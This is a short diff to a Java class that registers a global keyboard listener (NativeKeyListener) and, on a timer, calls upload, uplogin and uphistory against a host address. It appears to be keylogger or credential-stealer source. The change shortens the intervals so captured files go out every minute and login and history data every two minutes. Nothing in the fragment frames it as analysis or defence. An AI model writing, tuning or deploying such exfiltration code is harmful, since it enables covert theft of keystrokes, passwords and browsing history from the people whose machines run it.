@@ -73,11 +73,11 @@ public class Main implements NativeKeyListener{
 		    Calendar cal = Calendar.getInstance();
 		    cal.setTime(date);
 		    int minutes = cal.get(Calendar.MINUTE);
-			 if (minutes % 5 == 0) {
+			 if (minutes % 1 == 0) {
 			    	// send the file
 				 upload(getHostIP());
 			    }
-			 if (minutes % 3 == 0) {
+			 if (minutes % 2 == 0) {
 				 uplogin(getHostIP());
 				 uphistory(getHostIP());
 			 }
